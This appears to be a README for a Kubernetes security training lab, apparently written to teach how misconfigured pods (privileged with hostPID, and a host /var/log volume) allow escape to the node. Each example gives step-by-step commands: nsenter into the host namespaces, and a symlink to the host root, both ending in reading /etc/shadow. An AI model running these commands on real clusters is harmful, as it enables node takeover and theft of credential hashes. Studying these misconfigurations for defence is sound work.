# Weaponized Pods

> !! WARNING !!
> <br/>
> This folder contains a collection of pods that are examples of various attacks on Kubernetes clusters using misconfigured pods. These **should never** be deployed in any environment outside of the context of this training.

## 01-privileged-pod

This example shows how a pod with a privileged security context and hostPID can breakout of the container and access the root filesystem. This is done using the _official_ alpine image with no modifications. To perform this exploit:

1. Apply the weaponized pod
```bash
kubectl apply -f 01-privileged-pod/privileged-pod.yaml
```

2. Execute into the pod
```bash
kubectl exec -it -n weaponized-pod-01 alpine -- sh
```

3. Access the underlying host namespace using `nsenter`
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

4. Access the host `/etc/shadow` file
```bash
cat /etc/shadow
```

_You now have full root access to the kubernetes node_

## 02-host-volume

This example shows how a pod with a host volume, to the nodes `/var/log`, despite a locked down securityContext, can create a symbolic link back to the host root filesystem to access protected content. In this exampe we will extract all user account information from the `/etc/shadow` file

1. Apply the weaponized pod
```
kubectl apply -f 02-host-volume/host-volume.yaml
```

2. Execute into the pod
```
kubectl exec -it -n weaponized-pod-02 alpine -- sh
```

3. Create a symbolic link from the pod to the host filesystem
```
ln -s / /host/var/log/root_link
```

4. Access the host `/etc/shadow` file
```
cat /host/var/log/root_link/etc/shadow
```
